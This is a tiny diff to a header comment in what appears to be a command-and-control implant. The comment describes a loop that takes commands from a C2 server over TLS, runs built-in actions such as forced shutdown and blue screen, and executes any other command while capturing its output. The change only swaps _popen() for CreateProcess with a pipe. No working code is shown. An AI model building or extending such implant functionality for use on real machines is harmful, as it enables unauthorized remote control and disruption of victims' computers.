@@ -3,7 +3,7 @@
  * ==================================================
  * The command loop receives commands from the C2 over the encrypted TLS
  * channel, dispatches built-in actions (forceOff, blueScreen, quit), and
- * routes everything else through _popen() + captures stdout.
+ * routes everything else through CreateProcess + anonymous pipe + captures stdout.
  */
 
 #pragma once
